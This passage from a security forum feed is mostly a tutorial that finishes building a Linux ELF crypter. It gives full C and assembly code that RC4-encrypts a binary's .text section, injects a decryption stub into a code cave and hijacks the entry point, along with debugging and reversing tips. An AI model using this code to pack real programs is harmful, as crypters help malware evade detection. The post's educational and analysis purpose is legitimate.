<p>That is it. Actually it is pretty straightforward, so let’s code that stub. But before we need to do some small changes in the crypter, and prepare the assembly code for the stub.</p>
<h1>
<a name="the-stub-skeleton-2" class="anchor" href="https://0x00sec.org#the-stub-skeleton-2"></a>The <code>stub</code> skeleton</h1>
<p>We could write our <code>stub</code> such as it will look for the <code>.text</code> and <code>.rodata</code> sections and decrypt them, but, as this information is already needed by the crypter, and the crypter is going to inject the stub and patch it anyway, we better also add the pointers and size of the memory blocks to encode from the C code. This is easier and also will make our stub smaller.</p>
<pre><code class="lang-auto">stub_start:
	;; Let's create a stack frame 
	push rbp
	mov  rbp, rsp
	;; Save registerrs
	push rdi
	push rsi
	push rdx
	push rax
	
	;; Patch return address
	sub QWORD [rbp + 0x8], 5
	mov rax, [rbp + 0x8]
	;; Restore original instructions
patch1:	
	mov rdx, 0x1122334455667788
	mov QWORD [rax], rdx
	
	;; Change memory permissions
	;; Decrypt
        mov rax, 1    ; SYS_write = 1
        mov rdi, 1    ; fd = 1
        lea rsi, [rel msg]  ; buf = msg
        mov rdx, 13   ; count = 13 (the number of bytes to write)
        syscall  ;
	;; Restore memory permissions
		

	pop rax	
	pop rdx
	pop rsi
	pop rdi
	pop rbp
	ret
	

;;;  Data
text_ptr:       dq 0
text_size:      dw 0
rodata_ptr:     dq 0
rodata_size:    dw 0
key:            db "0x00Sec!",0
msg:    db 'Hello World!',0x0a

		
</code></pre>
<p>This is basically the stub for the last injection technique described in previous instalment but just including some variables that we will need and a stack frame that will make easier the multiple invocations of the <code>rc4</code> function to decrypt our program.</p>
<blockquote>
<p><em>Note: Yes, we have move the restoration of original instructions at the beginning of the program. Rational is that we will be adding code in this function and we do not want to update the offset to that instruction with every change.</em></p>
</blockquote>
<p>Also note that, we are restoring the original entry point before decrypting the text segment. This means that the crypter has to patch the stub with the <strong>Crypted instructions</strong> at the OEP, not the real ones. Or in other words, the crypter will patch the stub after crypting the text segment of the target binary.</p>
<p>In order to simplify the code, we will allocate space for the pointers and size to crypted sections, namely, <code>.text</code> and <code>.rodata</code>. The crypter will need this information to crypt the program anyway, so we will just make it write that data to the stub, during the injection process. This way, our <code>stub</code> doesn’t need to find the relevant sections and can be shorter.</p>
<p>For the <code>rc4</code> implementation, we can do three things:</p>
<ul>
<li>Extract the object code from the crypter binary itself… remember we have implemented an <code>rc4</code> function there.</li>
<li>Re-code the function directly in asm,</li>
<li>Compile our C code and link it with our asm stub.</li>
</ul>
<p>What should you do?.. Well, it depends, I will show you how to do two of the techniques above. That should give you enough information to be able to implement the last one by yourself. Which one is better?.. There is no one better, it depends on what you need to do… so you better learn all of them <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=10" title=":wink:" class="emoji" alt=":wink:"> .</p>
<h1>
<a name="extracting-rc4-from-c-program-3" class="anchor" href="https://0x00sec.org#extracting-rc4-from-c-program-3"></a>Extracting RC4 from C program</h1>
<p>As I said, we had implemented an <code>rc4</code> function on our crypter. It looks like this:</p>
<pre><code class="lang-auto">int rc4 (unsigned char *msg, int mlen, unsigned char *key, int klen) {
  int           i,j;
  unsigned char S[256]; // Permutation matrix
  
  // KSA: Key-Schedulling Algorithm
  for (i = 0; i &lt; 255; S[i] = i,i++);
  for (j = 0, i = 0; i &lt; 256; i++) {
    j = (j + S[i] + key[i % klen] ) % 256;
    SWAP(S[i],S[j]);
  }
  // Encoding
  i = j = 0;
  int cnt = 0;
  while (cnt &lt; mlen) {
    i = (i + 1) % 256;
    j = (j + S[i]) % 256;
    
    SWAP(S[i],S[j]);
    
    msg[cnt] = msg[cnt] ^ S[(S[i] + S[j]) % 256];
    cnt++;
  }

  return 0;
}
</code></pre>
<p>We can just compile our crypter and then extract the machine code associated to this function. We already know how to extract bytes from a file using <code>dd</code>, we just need to figure out the offset in the file where the function is, and its size. We can get this information in different ways.</p>
<p>We can use <code>objdump</code>:</p>
<pre><code>$ objdump -d crypter-1.4
(...)

00000000000009aa &lt;rc4&gt;:
     9aa:       55                      push   %rbp
     9ab:       48 89 e5                mov    %rsp,%rbp

c88:       c3                      retq

0000000000000c89 &lt;main&gt;:
     c89:       55                      push   %rbp
</code></pre>
<p>So, the  <code>rc4</code> function starts at offset <code>0x9aa</code> and ends at offset <code>0xc88</code>… That means that it size is <code>0xc88 - 0x9aa</code> = <code>735</code> bytes… Which is quite small and should fit in our test code cave.</p>
<p>Other way to get this information is using <code>readelf</code>:</p>
<pre><code>$ readelf -s crypter-1.4 | grep rc4
    55: 00000000000009aa   735 FUNC    GLOBAL DEFAULT   14 rc4
</code></pre>
<p>As you were expecting, we get the same numbers (note that those numbers can be different in your machine, specially if you have modified the crypter and because, your version at this point will be different to the one I’m using right now)…</p>
<p>Now we can use <code>dd</code> to extract the <code>rc4</code> function in binary form:</p>
<pre><code>dd if=crypter-1.4 skip=$((0x9aa)) bs=1 count=735 &gt; rc4.bin
</code></pre>
<p>After that, we can use one of the NASM pseudo-instructions to just insert these machine code in our asm program. They are named pseudo-instructions because they are not machine instructions but instructions aimed to NASM itself. One of these pseudo-instructions is <a href="https://www.nasm.us/xdoc/2.11.02/html/nasmdoc3.html#section-3.2.3" rel="noopener nofollow ugc"><code>incbin</code></a> that allows us to include a binary fine at a specific point in our assembler program.</p>
<blockquote>
<p><em>Note: All these values can be different in your system. Just understand the process and run each command getting the right values for your environment.</em></p>
</blockquote>
<p>So, our <code>stub</code>, for the time being, will look like this:</p>
<pre><code class="lang-auto">stub_start:
	
	;; Let's create a stack frame 
	push rbp
	mov  rbp, rsp
	;; Save registerrs
	push rdi
	push rsi
	push rdx
	push rax
	
	;; Restore original crypted instructions before decrypting
	sub QWORD [rbp + 0x8], 5 
	mov rax, [rbp + 0x8]
patch1:	
	mov rdx, 0x1122334455667788
	mov QWORD [rax], QWORD rdx

	;; Change memory permissions
	;; Decrypt
	
	
	pop rax	
	pop rdx
	pop rsi
	pop rdi
	pop rbp
	ret
	
_rc4:
	incbin 'rc4.bin'
		
;;;  Data
text_ptr:       dq 0
text_size:      dw 0
rodata_ptr:     dq 0
rodata_size:    dw 0
key:            db "0x00Sec!",0
msg:    db 'Hello World!',0x0a

</code></pre>
<p>At this point, we just need to call our new <code>_rc4</code> function to decode the <code>.text</code> and <code>.rodata</code> segments. I will just do it for the <code>.text</code> segment and I will leave it as an exercise to the reader to also decode <code>.rodata</code>.</p>
<h1>
<a name="updating-the-crypter-4" class="anchor" href="https://0x00sec.org#updating-the-crypter-4"></a>Updating the crypter</h1>
<p>Let’s get back to the crypter. We need to update it to write at <code>text_ptr</code> and <code>text_size</code> some information that will let the <code>stub</code> find the text segment and decrypt it. As we are targeting PIE binaries, the crypter does not know, at the time of crypting the binary, the runtime address of the relevant sections, so we need to use some differential value with respect to something else we know at run-time.</p>
<p>By now you should know a few ways of solving this problem. Don’t you?.. Anyway, I will just provide the stub offsets w.r.t OEP. This is convenient because we already know the OEP in our stub (we need to restore the instructions there). This is how the crypter loop to crypt the text section will look like when we add this change:</p>
<pre><code class="lang-auto">  for (i = 0; i &lt; elf_hdr-&gt;e_shnum; i++) {
    name = s_name + sh[i].sh_name;
    printf ("Section %02d [%20s]: Type: %d Flags: %lx | Off: %lx Size: %lx =&gt; ",
	    i, name,
	    sh[i].sh_type, sh[i].sh_flags,
	    sh[i].sh_offset, sh[i].sh_size);
    if (!strcmp (name, ".text")) {
      // encrypt section
      rc4 (p + sh[i].sh_offset, sh[i].sh_size, (unsigned char*)key, strlen (key));

      text_ptr = oep - sh[i].sh_offset;
      text_size = sh[i].sh_size;
    }
    else printf ("\n");
  }
</code></pre>
<p>Yes, that easy… instead of storing the absolute offset to the <code>.text</code> section, we just store the relative offset with respect to the <code>OEP</code>. Now we just need to write this information in our stub. Let’s get the offset to the data variables we declare in it:</p>
<pre><code>$ readelf -s stub02.o | grep text
     6: 00000000000002ee     0 NOTYPE  LOCAL  DEFAULT    1 text_ptr
     7: 00000000000002f6     0 NOTYPE  LOCAL  DEFAULT    1 text_size
</code></pre>
<p>And now we just need to write those values, just after dumping the stub in the code cave…</p>
<pre><code class="lang-auto">  // Patch text_ptr and text_size
  *((long*)(p + ccave + 0x2ee)) = text_ptr;
  *((uint32_t*)(p + ccave + 0x2f6)) = text_size;
</code></pre>
<p>_<em>Note: You may want to define a couple of constants… it is not good to have magic numbers in your code… but I’ll also leave this as an exercise for you :).</em></p>
<h1>
<a name="back-to-the-stub-5" class="anchor" href="https://0x00sec.org#back-to-the-stub-5"></a>Back to the stub</h1>
<p>At this point, we have all the information needed to decode the text segment in our stub, so we can finally call <code>rc4</code> and decrypt the binary. For that we just need to pass the correct parameters in the usual registers (according to the System V ABI that we are so familiar with at this point). The last thing we have to do is to calculate the real address of the text segment using the <code>OEP</code> and the offset provided by the crypter… Basically we just need to add that offset to the OEP that is stored at <code>[rbp+0x08]</code>…</p>
<p>So… this is what you need to add to your stub… Nooo, just kidding, At this point I’ll give you the whole stub code. We have made too many changes and you may have got lost…</p>
<pre><code class="lang-auto">
stub_start:
	
	;; Let's create a stack frame 
	push rbp
	mov  rbp, rsp
	
	;; Save registers
	push rdi
	push rsi
	push rdx
	push rax
	
	;; Update return addres to be the OEP
	sub QWORD [rbp + 0x8], 5 
	mov rax, [rbp + 0x8]
	;; Restore the OEP instruction
patch1:	
	mov rdx, 0x1122334455667788
	mov QWORD [rax], QWORD rdx
	
	;; TODO: Change memory permissions 
	;; Decrypt
	;; Decode text segment
	
	mov rax, [rbp + 0x8]	; Get OEP	
 	mov rdi, [rel text_ptr]	; .text ptr will be relative to OEP
 	add rdi, rax
 	lea rsi, [rel key]
 	mov rdx, [rel text_size]
 	mov rcx, 8
		
	call _rc4 ;; _rc4 (rdi, rsi, rdx, rcx);

	;; Restore memory permissions
	
	pop rax	
	pop rdx
	pop rsi
	pop rdi
	pop rbp
	ret       ;; We just return to the OEP
	
_rc4:
	 	incbin 'rc4.bin'
;;;  Data
text_ptr:       dq 0
text_size:      dw 0
rodata_ptr:     dq 0
rodata_size:    dw 0
key:            db "0x00Sec!",0

</code></pre>
<p>You can likely save a couple of instructions in the code above, but I preferred to keep it simpler for you to make it more comprehensive.</p>
<p>And just for completeness, this is the final code of the crypter main function (you should be able to extract the stub machine code and store it on the <code>sc</code> variable by yourself:</p>
<pre><code class="lang-auto">int main (int argc, char *argv[]) {
  
  if (argc != 2) {
    fprintf (stderr, "Invalid number of parameters\n");
    fprintf (stderr, "Usage: crypter binary\n");
    exit (-1);
  }
  // Open file
  int fd;
  if ((fd = open (argv[1], O_RDWR, 0)) &lt; 0) DIE ("open");
  
  // get size
  struct stat _st;
  if (fstat (fd, &amp;_st) &lt; 0) DIE ("fstat");
  
  // Map file
  unsigned char *p;
  if ((p = mmap (0, _st.st_size, PROT_READ | PROT_WRITE,
		 MAP_SHARED, fd, 0)) == MAP_FAILED) DIE ("mmap");
		 
  // Find code segment
  Elf64_Ehdr *elf_hdr = (Elf64_Ehdr*) p;
  // Sanity checks oimitted
  printf ("Section Table located at : %ld\n", elf_hdr-&gt;e_shoff);
  printf ("Section Table entry size : %d\n",  elf_hdr-&gt;e_shentsize);
  printf ("Section Table entries    : %d\n",  elf_hdr-&gt;e_shnum);  

  int           i;
  Elf64_Shdr    *sh     = (Elf64_Shdr*)(p + elf_hdr-&gt;e_shoff) ;
  Elf64_Phdr    *ph     = (Elf64_Phdr*)(p + elf_hdr-&gt;e_phoff) ;
  char          *s_name = p + sh[elf_hdr-&gt;e_shstrndx].sh_offset;
  Elf64_Addr     oep    = elf_hdr-&gt;e_entry;
  char          *key    = "0x00Sec!\0";  // Use 8 characters to make asm simpler.
  char          *name      = NULL;
  long           text_ptr  = 0;
  uint32_t       text_size = 0; 

  for (i = 0; i &lt; elf_hdr-&gt;e_shnum; i++) {
    name = s_name + sh[i].sh_name;
    printf ("Section %02d [%20s]: Type: %d Flags: %lx | Off: %lx Size: %lx =&gt; ",
	    i, name,
	    sh[i].sh_type, sh[i].sh_flags,
	    sh[i].sh_offset, sh[i].sh_size);
    if (!strcmp (name, ".text")) {
      rc4 (p + sh[i].sh_offset, sh[i].sh_size, (unsigned char*)key, strlen (key));

      text_ptr = oep - sh[i].sh_offset;
      text_size = sh[i].sh_size;
      printf ("%s", " - Crypter!");
    }
    else printf ("\n");
  }

  long ccave = 0;
  int  ccave_size = 0;
  
  for (i = 0; i &lt; elf_hdr-&gt;e_phnum; i++) {
    if (ph[i].p_type == PT_LOAD) {
      printf ("PHR %d  flags: %d (offset:%ld size:%ld)\n",
	      i, ph[i].p_flags, ph[i].p_offset, ph[i].p_filesz);
      if (ccave) ccave_size = ph[i].p_offset - ccave;
      if (ph[i].p_flags &amp; PF_X) {
	    ph[i].p_flags |= PF_W; // Add write permissions
	    ccave = ph[i].p_offset + ph[i].p_filesz;
      }
    }
  }

  printf ("Code Cave at %ld size: %ld\n", ccave, ccave_size);

  printf ("Original Entry Point at: %x\n", oep);
  if (ccave_size &gt; sc_len) {
    printf ("Injecting code at %lx\n", ccave);
    for (i = 0; i&lt;sc_len; p[ccave+i]=sc[i],i++);
  }
  
  // Store 8 bytes at current entry point already crypted
  unsigned char op[8], *ep =  p + elf_hdr-&gt;e_entry;
  for (i = 0; i &lt; 8; op[i++]= ep[i]);
  
  ep[0] = 0xe8;                     // CALL Opcode
  *((int*)&amp;ep[1]) = ccave- oep - 5; // Inject offset to OEP
  
  // Copy codes into shellcode
  ep = p + ccave + PATCH_OFF + 2; // XXX: You already know how to calculate PATCH_OFF
  for (i =0; i &lt; 8; ep[i] = op[i], i++);
  printf ("Patching instruction at offset: %lx\n", ccave + PATCH_OFF + 2);
  
  // Patch text_ptr and text_size 
  // XXX: YOu also know how to get TEXT_PTR_OFF and TEXT_SZ_OFF
  *((long*)(p + ccave + TEXT_PTR_OFF)) = text_ptr;
  *((uint32_t*)(p + ccave + TEXT_SZ_OFF)) = text_size;
  printf ("Patching text segment at offset: %lx\n", ccave+TEXT_PTR_OFF);
  printf ("Patching text segment size at offset: %lx\n", ccave+TEXT_SZ_OFF);
  munmap (p, _st.st_size); 
  
  close (fd);
  return 0;
} 

</code></pre>
<p>Congratulations!!!. You have finished your first crypter.</p>
<p>I will leave the change of the memory permissions as an exercise. You just need to call the <code>mprotect</code> system call… and at this point that shouldn’t be a problem… otherwise you may need to read the series all over again.</p>
<h1>
<a name="reversing-crypters-6" class="anchor" href="https://0x00sec.org#reversing-crypters-6"></a>Reversing Crypters</h1>
<p>You may be thinking that the way I extracted the code from the C version of the crypter and inserted in the asm may look overkill, and it is, however, I wanted to go through this process because that is closer to what you may need to do when analysing a real crypter… You can always go for the dynamic analysis and run the program until it gets decrypted in memory, but sometimes having the crypt routine isolated can be handy.</p>
<p>Actually, for our current crypter implementation, the dynamical analysis is not that straightforward. I will share with you a few notes on how I was debugging the crypter while building it.</p>
<p>The first issue I had already mentioned in the last instalment. The <code>stub</code> code is added out of the section, in the code cave, and therefore, neither <code>gdb</code> nor <code>objdump</code> can find it.</p>
<p>In order to get to the <code>stub</code> code for debugging it. First set a break point at <code>_start</code> using the command <code>b _start</code>. And then run the program with the <code>r</code> command:</p>
<pre><code>(gdb) b _start
Breakpoint 1 at 0x8a0
(gdb) r
Starting program: /tmp/k1

Breakpoint 1, 0x00005555555548a0 in _start ()
(gdb) disassemble _start
Dump of assembler code for function _start:
=&gt; 0x00005555555548a0 &lt;+0&gt;:     callq  0x555555555780
   0x00005555555548a5 &lt;+5&gt;:     rex.RXB add (%r10),%r12b
   0x00005555555548a8 &lt;+8&gt;:     jmp    0x555555554905 &lt;deregister_tm_clones+53&gt;
</code></pre>
<p>These sequence of commands will bring us to the call to our <code>stub</code>. Now we just need to jump in the stub using the single instruction command ,<code>si</code>. However <code>gdb</code> will not recognise that as a function and we cannot just disassemble the stub. We can do a couple of things:</p>
<ul>
<li>
<p>Dump the memory as instructions</p>
<pre><code>  (gdb) x/10i 0x0000555555555780
  =&gt; 0x555555555780:      push   %rbp
     0x555555555781:      mov    %rsp,%rbp
     0x555555555784:      push   %rdi
     0x555555555785:      push   %rsi
     0x555555555786:      push   %rdx
     0x555555555787:      push   %rcx
     0x555555555788:      push   %rbx
     0x555555555789:      push   %rax
     0x55555555578a:      push   %r8
     0x55555555578c:      push   %r9
</code></pre>
</li>
<li>
<p>Use the layout command. <code>layout regs</code> will split the screen showing at the top the registers and below the assembler code of the current and next instructions.</p>
</li>
</ul>
<p>The next point, took me a while to figure out. At least in my box, looks like <code>gdb</code> uses a traditional breakpoint for <code>_start</code>. The one we set above to get into the call to the stub. A traditional breakpoint consists on writing a <code>int 3</code> (opcode <code>0xcc</code>)in the address we want the program flow interrupted and the control returned to our debugger. <code>int 3</code> is just one byte long so we can place it anywhere. You can read a little bit about how it works in the article about the <a href="https://0x00sec.org/t/ibi-crypter-a-jit-crypter-poc/1373">IBI Crypter</a> here at 0x00sec.</p>
<p>Anyway, <code>gdb</code> writes this 0xcc opcode at the <code>_start</code> position, but that fact makes the restore of the original opcodes we do later in our stub fail. I was very confused seen how all the bytes except the first one where restored until I realised that it could be related to the break point… So, just after stopping at <code>_start</code> delete the breakpoint with the command <code>d 1</code>, so the original bytes of <code>_start</code> can be successfully restored.</p>
<p>Hope this tips helps you in your own projects!</p>
<h1>
<a name="rc4-in-assembler-7" class="anchor" href="https://0x00sec.org#rc4-in-assembler-7"></a>RC4 in assembler</h1>
<p>Our crypter works pretty well and it is not that big. The <code>rc4</code> function generated by my compiler (without any special optimisation) is 735 bytes… We can make it shorter with a native asm implementation.</p>
<p>Before getting into the gory details, let’s quickly remember how the RC4 algorithm implementation looked in C:</p>
<pre><code class="lang-auto">  // KSA: Key-Schedulling Algorithm
  for (i = 0; i &lt; 255; S[i] = i,i++);
    
  for (j = 0, i = 0; i &lt; 256; i++) {
    j = (j + S[i] + key[i % klen] ) % 256;
    SWAP(S[i],S[j]);
  }
    // Encoding
  i = j = 0;
  while (cnt &lt; mlen) {
    i = (i + 1) % 256;
    j = (j + S[i]) % 256;
    SWAP(S[i],S[j]);
    
    msg1[cnt++] = msg[cnt] ^ S[(S[i] + S[j]) % 256];
  }
</code></pre>
<p>So, the first thing we need to do is the <em>Key-Scheduling Algorithm</em> that requires two loops and a local array to store our permutation matrix <code>S</code>. Let’s create a stack frame and allocate the memory for the <code>S</code> vector:</p>
<pre><code class="lang-auto">    EQU     S 256
rc4:
	push rbp
	mov  rbp, rsp
	push r13
	sub  rsp, S
	mov r13, rdx
	;; KSA
	;; Actual Message de/crypt
	pop r13
	leave    ;; retore RBP and RSP
	ret
</code></pre>
<p>So far so good. In addition to the stack frame and the allocation of <code>S</code>, we just save <code>r13</code> that we will use for storing the third parameter, that in this case is the length of the message. This was just convenient, but you can just store that value in the stack allocating a bit more space. You already know how to do that. Of course we need to restore it before leaving the function.</p>
<p><em>NOTE:I changed the order of the parameters for the assembler version, with regards to the C version. I used first and second parameters for the message and key pointers respectively. Those parameters goes into <code>si</code> and <code>di</code>and are convenients. So third parameter is the size of the message and forth is the size of the key that, for this case I have fixed to 8 for convenience.</em></p>
<p>That is it. Now it is time to do the first KSA initialisation loop:</p>
<pre><code class="lang-auto">;    for (i = 0; i &lt; 255; S[i] = i,i++);
	lea r8, [rbp - S]     ;; r8 points to the S matrix
	mov rax, 256          ;; We will loop for 256 values
KSA0:
	mov [r8 + rax], al     ;; S[al] = al;
	dec rax                ;; al--;
	jnz KSA0
</code></pre>
<p>This loop was easy, right?. We just counted down instead of up, just to save a comparison for the last jump. Now let’s implement the <em>shuffle</em> stage of the KSA. This is implemented in C by the following loop:</p>
<pre><code class="lang-auto">  for (j = 0, i = 0; i &lt; 256; i++) {
    j = (j + S[i] + key[i % klen] ) % 256;
    SWAP(S[i],S[j]);
  }
</code></pre>
<p>Here we are going to use a couple of tricks to get rid of the module operators. The module operator <code>%</code> (we had already talked about it), is not easy to implement in the general case, however, when the divisor is a power of two, we can just substitute it by an <code>AND</code> operation. As we said when we introduced the <code>rc4</code> algorithm we are very grateful to Mr Rivest for making the algorithm byte friendly… that means that everything is related to the size of a byte and that is where the <code>%256</code> module above comes from.</p>
<p>For that module (<code>% 256</code>), when working on assembler… we can just use 8 bit registers and forget about the module… And that is what we are going to do. Well, you cannot always do that, but for this specific case it will work just fine.</p>
<p>For the key… well, we are going to chose a key that is 8 characters long. Doing that, the <code>% klen</code> in the code above can just be substituted by a <code>AND KEY_MASK</code> where <code>KEY_MASK</code> is <code>0x07</code>.</p>
<p>Taking this into account, the loop can be implemented in asm like this:</p>
<pre><code class="lang-auto">KEY_MASK  EQU     0x07

;; 2. suffle
	xor rdx, rdx		; key counter (i % KEY_LEN) rdx
	xor rbx,rbx		    ; j counter
	mov r9, key		    ; Key pointer
	xor rcx,rcx		    ; i counter	
KSA1:
	;; calculate index
	and  rdx, KEY_MASK 	; i % KEY_LEN
	mov  al, [r8 + rcx]	; S[i]
	add  al, [r9 + rdx]	; S[i] + key [i%KEY_LEN]
	add  bl, al		    ; j = j + S[i] + key [ i % KEY_LEN]
	
	mov  r11b, [r8 + rcx]
	mov  r12b, [r8 + rbx]
	mov  [r8+rcx], r12b
	mov  [r8+rbx], r11b 	; swap (S[i],S[j])
	
	inc  rcx
	mov  rdx, rcx
	cmp  rcx, 256
	jnz  KSA1
</code></pre>
<p><em>Note: In this case we cannot do the loop counting down as the resulting permutation matrix will be different due to the <code>swap</code> instruction. Do you see the <code>cmp</code> towards the end? the one we saved in the previuswsloop…</em></p>
<p>As you can see, with the exception of the key, we have just got rid of all the module operators that we used in the C code… actually we could had implemented this way in C. Also note the use of the 8 bytes registers <code>al</code>, <code>bl</code> , <code>r11b</code> and <code>r12b</code>.</p>
<p>For intel platforms the low byte of the historical 16bits registers (<code>AX</code>, <code>BX</code>, <code>CX</code>, <code>DX</code>,…) is named with an <code>l</code> and the high byte is named with a ‘h’… and you should be able to figure out why <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=10" title=":slight_smile:" class="emoji" alt=":slight_smile:"> . This way, the 16bits register ‘AX’ can be accessed using the register <code>AH</code> for the high byte, and <code>AL</code> for the low byte.</p>
<p>For the new registers introduced in the 64bits architecture, the naming is different. A <code>b</code> represents the last byte of the register, a ‘w’ to access the last 16 bits word and a <code>d</code> to access the last 32 bits. Therefore, <code>r11b</code> and <code>r12b</code> are the last byte of those registers.</p>
<h1>
<a name="time-to-crypt-8" class="anchor" href="https://0x00sec.org#time-to-crypt-8"></a>Time to crypt</h1>
<p>Now we can implement the crypt loop. If you had understood the initialisation code, this part doesn’t have any further surprises and should be pretty straightforward to understand… we just point now to the message instead of to the key and slightly change some of the operations:</p>
<pre><code class="lang-auto">	;; --------------------------------------------
	;; Encrypt
	;; -----------------------------------
	mov r9, rdi		; Now r9 points to the message 
	xor rcx,rcx		; i =  0
	xor rdx, rdx	; j =0
	xor r10, r10	; cnt = 0;
	xor rax,rax
ENC0:
	;;  i = (i + 1) % 256;
	inc cl

	;; j = (j + S[i]) % 256
	add dl,[r8 + rcx]
	
	;;  SWAP (s[i], S[j])
	mov  r11b, [r8 + rcx]
	mov  r12b, [r8 + rdx]
	mov  [r8+rcx], r12b
	mov  [r8+rdx], r11b 
	
	;; tmp = S[S[i]+S[j])%256]
	mov al, [r8 + rcx]
	add al, [r8 + rdx] 		;; S[i]+S[j])%256

	
	mov bl, [r8 + rax]
	xor [r9+r10], bl	;; msg[cnt] ^= S[S[i]+S[j])%256]

	inc r10
	cmp r10, r13
	jnz ENC0
</code></pre>
<p>Be free to comment in case there is something not clear, but if you have understood the concept of working with the 8 bits registers there is not much more to say.</p>
<p>Now we can compile our new stub…</p>
<pre><code>$ nasm -f elf64 -o stub03.o stub03.asm
$ readelf -S stub03.o | grep -A1 .text
  [ 1] .text             PROGBITS         0000000000000000  00000180
       0000000000000131  0000000000000000  AX       0     0     16
</code></pre>
<p>This gives us a 0x131 (305) bytes long stub, that is less than half of the C version we extracted from the C code. You can save a few more bytes with some changes in the code, but not much more.</p>
<h1>
<a name="trying-the-crypter-9" class="anchor" href="https://0x00sec.org#trying-the-crypter-9"></a>Trying the crypter</h1>
<p>At this point I tried my crypter and it failed miserably… that is the reason this instalment took so long to be released, it took me a while to figure out the problem. I had to implement quite some debug code in the <code>stub</code> itself.</p>
<p>So, what happened?. Everything worked as expected but only part of the <code>.text</code> segment was actually decoded. After some debugging I found when that happened and after some more debugging I found that the permutation matrix changed in the assembler version… So I tried to find out what was wrong with the assembler… but as you can see, the code for the <code>rc4</code> algorithm is pretty basic, and I couldn’t find any issue with it… And that was because the issue was in the C code.</p>
<p>If you remember previous instalments, I used a macro to implement the <code>SWAP</code> of two bytes that looked like this:</p>
<pre><code class="lang-auto">#define SWAP(a,b) a += b; b= a -b; a-=b;
</code></pre>
<p>The problem happen when we have to swap the same entry in the matrix… calling something like <code>SWAP(S[i],S[i])</code>, because in this case, when we modify <code>a</code> we are also modifying <code>b</code> and therefore all the calculations goes wrong… Just change all <code>b</code>s to <code>a</code>s in the expression above and you will see that you get two 0s.</p>
<p>When we extracted the code from the C program, the algorithm had the same flaw (in the crypter and in the <code>stub</code>) and therefore it was actually encoding and decoding the sequences all right. The consequence of the bug above is that at some point we have two zeros in the permutation matrix… the output would be a bit less random, but it still looks like crypted code.</p>
<p>But now that we wrote the asm directly and use temporal registers to swap the values in the permutation matrix the algorithm produced a different permutation matrix than the C version… but that happens just after a while… which made this bug tricky to find and debug.</p>
<p>Anyway, in order to fix this, I changed the C macro to:</p>
<pre><code class="lang-auto">#define SWAP(x, y) do { typeof(x) tmp = x; x = y; y = tmp; } while (0)
</code></pre>
<p>and everything started working like a charm. That is the basic <code>swap</code> that uses a temporal variable.</p>
<h2>
<a name="why-the-do-while-10" class="anchor" href="https://0x00sec.org#why-the-do-while-10"></a>Why the <code>do... while</code>
</h2>
<p>You may be wondering why the <code>swap</code> code is surrounded by that useless <code>while</code> loop. Useless because the condition is never true. Well, writing macros may be tricky… Imagine that you need to write code like this:</p>
<pre><code class="lang-auto">if (some_condition) SWAP (i,j);
</code></pre>
<p>Without the <code>while</code> loop, the pre-processor will expand the macro to this:</p>
<pre><code class="lang-auto">if (some_condition) typeof(x) tmp = x; x = y; y = tmp; 
</code></pre>
<p>Do you see the problem?.. No?.. Let’s re-order the code</p>
<pre><code class="lang-auto">if (some_condition) 
    typeof(x) tmp = x; 
x = y; y = tmp; 
</code></pre>
<p>Now it may be clear. You can just use the brackets… but in that case we will get an extra semicolon after the macro expansion:</p>
<pre><code class="lang-auto">#define SWAP(x, y) { typeof(x) tmp = x; x = y; y = tmp; }
if (some_condition) SWAP (i,j);
</code></pre>
<p>This will expand to:</p>
<pre><code class="lang-auto">if (some_condition)
{
  typeof(x) tmp = x; x = y; y = tmp; 
};   // &lt;====== See this colon here?
</code></pre>
<p>You see the semicolon?.. In that example is fine… but if we had an <code>else</code> following that <code>if</code> statement we will get a compilation error. Using the <code>while</code> loop we avoid all these problems:</p>
<pre><code class="lang-auto">if (some_condition)
  do { 
    typeof(x) tmp = x; x = y; y = tmp; 
	} while (0) ; // &lt;== Semicolon here is OK
else // &lt;== Else here is also fine
</code></pre>
<p><em>Note: Yes, sure… we should also had used the while loop with the original macro…  I just didn’t wanted to introduce too many concepts simultaneously.</em></p>
<h1>
<a name="further-steps-11" class="anchor" href="https://0x00sec.org#further-steps-11"></a>Further Steps</h1>
<p>I will finish this mini series about crypters here. There are a few things I haven’t completely cover, but I believe I have given you all the tools to solve those issues by yourself. Trying to solve things by yourself is key to the learning process, if you do not believe me just try it by yourself. What you learnt that way will be engraved in stone in your brain. Said that, these are the further steps you can follow to complete your PPCC or <strong>PPCC is Pico’s Cypter Certification</strong> :).</p>
<ul>
<li>Compile your <code>rc4</code> C routing into an ELF object code and link it to the asm. You will need to deal with relocations. That is something we haven’t cover, but, by now, you should be able to bring up the ELF specification, and go through it to figure out how to find that information and how to applied it.</li>
<li>The patching mechanism described here doesn’t work with certain binaries. I just try, for instance with <code>xeyes</code> in my system and it failed… That will require some investigation in your side</li>
<li>In general, you may need to patch more sections in your binary… you can just repeat the code many times or go creative and practice some assembly coding.</li>
</ul>
<h1>
<a name="conclusion-12" class="anchor" href="https://0x00sec.org#conclusion-12"></a>Conclusion</h1>
<p>This instalment completes this miniseries on crypters. We have gone through the insights of the ELF format, find holes to inject code and actually injecting it. We learnt a little bit about cryptography and implemented a real cryptography algorithm in assembly. We have also learnt how to extract functions from binary programs and use them in our own code. As a result we have got a working crypter that uses a 300 bytes stub and a not trivial algorithm. Not bad right?</p>
            <p><small>5 posts - 4 participants</small></p>
            <p><a href="https://0x00sec.org/t/progamming-for-wannabes-xv-crypters-part-iii/27934">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/progamming-for-wannabes-xv-crypters-part-iii/27934</link>
          <pubDate>Tue, 28 Dec 2021 09:41:39 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-27934</guid>
          <source url="https://0x00sec.org/t/progamming-for-wannabes-xv-crypters-part-iii/27934.rss">Progamming for Wannabes XV. Crypters Part III</source>
        </item>
        <item>
          <title>Programming for Wannabes XIV. Crypters Part II</title>
          <dc:creator><![CDATA[0x00pf]]></dc:creator>
          <category>Programming</category>
          <description><![CDATA[
            <p>In the previous instalment we manage to find the relevant parts of the binary to crypt and actually crypt them. Now we need to inject our stub code and modify the binary to execute it before anything else. This gonna be fun.</p>
<h1>
<a name="a-test-stub-1" class="anchor" href="https://0x00sec.org#a-test-stub-1"></a>A Test Stub</h1>
